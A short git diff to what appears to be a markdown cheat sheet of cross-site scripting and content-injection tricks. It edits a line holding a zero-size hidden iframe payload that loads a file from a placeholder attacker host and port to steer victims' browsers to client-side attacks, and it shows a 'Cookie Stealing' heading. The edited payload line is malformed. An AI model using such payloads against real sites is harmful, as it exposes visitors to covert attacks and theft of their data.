@@ -25,7 +25,6 @@ If the application does not filtering these characters by removing or encoding t
 ```
 
 
-
 ## Useful Tricks
 Listener at the ready you can check if you get a connection back:
 ```html
@@ -35,7 +34,7 @@ Listener at the ready you can check if you get a connection back:
 
 Content injection, server a file with an iframe of no size sending victims browser to a client-side attack or to script that gathers information. 
 ```html
-<iframe src=http://$attacker-ip:port/file height=”0” width=”0”></iframe>
+<iframe> src=http://$attacker-ip:port/file height=”0” width=”0”></iframe>
 ```
 
 Cookie Stealing
